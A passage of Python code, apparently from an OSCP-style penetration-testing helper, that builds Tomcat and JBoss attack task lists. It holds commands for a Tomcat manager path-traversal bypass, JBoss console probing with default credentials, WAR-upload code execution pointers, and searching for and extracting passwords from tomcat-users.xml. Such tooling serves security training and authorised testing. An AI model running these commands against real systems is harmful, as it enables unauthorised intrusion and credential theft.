                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'BYPASS'],
                        'flag_explanations': {
                            'curl -s': 'Silent HTTP request',
                            '-u ":"': 'Empty Basic Auth (bypass some checks)',
                            '/..;/manager/html': 'Path traversal using semicolon (Tomcat normalization bug)'
                        },
                        'success_indicators': [
                            'Manager page accessible without auth',
                            'HTTP 200 response',
                            'Manager GUI loads'
                        ],
                        'failure_indicators': [
                            'HTTP 401 (still requires auth)',
                            'HTTP 404 (not vulnerable)',
                            'HTTP 403 (patched)'
                        ],
                        'next_steps': [
                            'Upload WAR for RCE (see Deploy WAR task)',
                            'Try other paths: /..;/manager/status, /..;/host-manager',
                            'Test alternate bypass: /{path};param=value/manager/html'
                        ],
                        'alternatives': [
                            f'Manual browser: Navigate to {base_url}/..;/manager/html',
                            f'Alternate bypass: curl -s {base_url}/;param=value/manager/html',
                            'Reference: https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/'
                        ],
                        'notes': 'CVE-2007-1860 and similar. Works when Tomcat is behind reverse proxy with incorrect path mapping. Also test: /lalala/..;/manager/html. Semicolon treated as path separator in some configs.',
                        'estimated_time': '2-3 minutes'
                    }
                },
                {
                    'id': f'path-traversal-examples-{port}',
                    'name': 'Test /examples Vulnerability',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/examples/jsp/snp/snoop.jsp',
                        'description': 'Test for information disclosure via Tomcat example scripts',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            'curl -s': 'Silent HTTP request',
                            '/examples/jsp/snp/snoop.jsp': 'Example JSP that displays request/session info'
                        },
                        'success_indicators': [
                            'Page loads with request details',
                            'HTTP headers visible',
                            'Session information disclosed',
                            'Server internal paths revealed'
                        ],
                        'failure_indicators': [
                            'HTTP 404 (/examples removed)',
                            'HTTP 403 (access denied)',
                            'Empty response'
                        ],
                        'next_steps': [
                            'Test other examples: /examples/servlet/SessionExample, /examples/jsp/sessions/carts.html',
                            'Look for XSS: /examples/jsp/num/numguess.jsp',
                            'Check sendmail: /examples/jsp/mail/sendmail.jsp (potential SMTP relay)',
                            'Reference: https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/'
                        ],
                        'alternatives': [
                            'Browser: Visit /examples/ and click through examples manually',
                            f'Test all: for path in /examples/jsp/snp/snoop.jsp /examples/servlet/SessionExample /examples/jsp/include/include.jsp; do curl -s {base_url}$path | head -10; done'
                        ],
                        'notes': 'Tomcat 4.x-7.x ship with vulnerable examples. Targets: /examples/jsp/num/numguess.jsp, /examples/jsp/snp/snoop.jsp, /examples/servlet/SessionExample, /examples/jsp/mail/sendmail.jsp. May disclose: server paths, Java version, session IDs, request headers.',
                        'estimated_time': '3-5 minutes'
                    }
                }
            ]
        })

        # TASK 8: JBoss Enumeration
        tasks['children'].append({
            'id': f'jboss-enum-{port}',
            'name': 'JBoss Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'jboss-console-{port}',
                    'name': 'Discover JBoss Management Consoles',
                    'type': 'command',
                    'metadata': {
                        'command': f'for path in /admin-console /jmx-console /management /web-console /web-console/ServerInfo.jsp /status?full=true; do echo "Testing $path..."; curl -s -o /dev/null -w "%{{http_code}}" {base_url}$path; echo; done',
                        'description': 'Test common JBoss management console paths',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            'for path in ...': 'Loop through common JBoss paths',
                            'curl -s -o /dev/null': 'Silent request, discard body',
                            '-w "%{http_code}"': 'Output only HTTP status code',
                            '/admin-console': 'JBoss admin interface',
                            '/jmx-console': 'JMX management console (JBoss 5-7)',
                            '/web-console': 'Web console (JBoss 6-7)',
                            '/status?full=true': 'Server status details'
                        },
                        'success_indicators': [
                            'HTTP 200 response on any path',
                            'HTTP 401 (authentication required = console exists)',
                            'Console login page loads'
                        ],
                        'failure_indicators': [
                            'All HTTP 404 responses (not JBoss)',
                            'Connection refused',
                            'Custom error pages'
                        ],
                        'next_steps': [
                            'Test default credentials: admin/admin',
                            'Access MBeans via /jmx-console or /web-console/Invoker',
                            'Run JexBoss for automated exploitation',
                            'Use Metasploit: auxiliary/scanner/http/jboss_vulnscan'
                        ],
                        'alternatives': [
                            'Manual browser: Test each path individually',
                            'Automated: jexboss -u {base_url}',
                            'Metasploit: use auxiliary/scanner/http/jboss_vulnscan; set RHOSTS {target}',
                            'Google Dork: inurl:status EJInvokerServlet'
                        ],
                        'notes': 'JBoss management consoles often use default creds (admin/admin). MBeans access allows code execution. JBoss 5/earlier: /invoker/JMXInvokerServlet, /invoker/EJBInvokerServlet. JBoss 6-7: /web-console/Invoker. Install JexBoss: git clone https://github.com/joaomatosf/jexboss && cd jexboss && pip install -r requires.txt',
                        'estimated_time': '2-3 minutes'
                    }
                }
            ]
        })

        # TASK 9: Post-Exploitation
        tasks['children'].append({
            'id': f'post-exploit-{port}',
            'name': 'Post-Exploitation: Tomcat',
            'type': 'parent',
            'children': [
                {
                    'id': f'tomcat-users-xml-{port}',
                    'name': 'Locate tomcat-users.xml',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -name tomcat-users.xml 2>/dev/null',
                        'description': 'Find Tomcat credentials file with user roles',
                        'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'CREDS', 'MANUAL'],
                        'flag_explanations': {
                            'find': 'Search filesystem',
                            '/': 'Start from root directory',
                            '-name tomcat-users.xml': 'Search for filename',
                            '2>/dev/null': 'Suppress permission denied errors'
                        },
                        'success_indicators': [
                            'File path displayed: /usr/share/tomcat9/etc/tomcat-users.xml',
                            'Alternative paths: /etc/tomcat9/tomcat-users.xml, /opt/tomcat/conf/tomcat-users.xml'
                        ],
                        'failure_indicators': [
                            'No results (file not present or renamed)',
                            'Permission denied on all paths'
                        ],
                        'next_steps': [
                            'Read file: cat /path/to/tomcat-users.xml',
                            'Extract credentials: grep -E "<user|password"',
                            'Test creds on Manager: curl -u user:pass /manager/html',
                            'Check roles: manager-gui, manager-script, admin-gui'
                        ],
                        'alternatives': [
                            'Common locations: /usr/share/tomcat*/etc/, /etc/tomcat*/, /opt/tomcat/conf/',
                            'Alternative: locate tomcat-users.xml',
                            'If web shell: cat /usr/share/tomcat9/etc/tomcat-users.xml'
                        ],
                        'notes': 'tomcat-users.xml contains username, password, and role assignments. Roles: manager-gui (GUI access), manager-script (API access), manager-jmx (JMX access), admin-gui (host-manager). Need manager-script/manager/admin for WAR deployment.',
                        'estimated_time': '1-2 minutes'
                    }
                }
            ]
        })

        # TASK 10: Exploit Research (conditional on version)
        if version and version != 'unknown':
            tasks['children'].append({
                'id': f'exploit-research-{port}',
                'name': f'Exploit Research: {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-{port}',
                        'name': f'SearchSploit: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit "{product} {version}"',
                            'description': 'Search ExploitDB for known vulnerabilities',
                            'tags': ['OSCP:HIGH', 'RESEARCH']
                        }
                    },
                    {
                        'id': f'cve-lookup-{port}',
                        'name': f'CVE Lookup: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'curl -s "https://cve.circl.lu/api/search/{product}/{version}" | jq .',
                            'description': 'Query CVE database for version-specific vulnerabilities',
                            'tags': ['RESEARCH']
                        }
                    }
                ]
            })

        return tasks
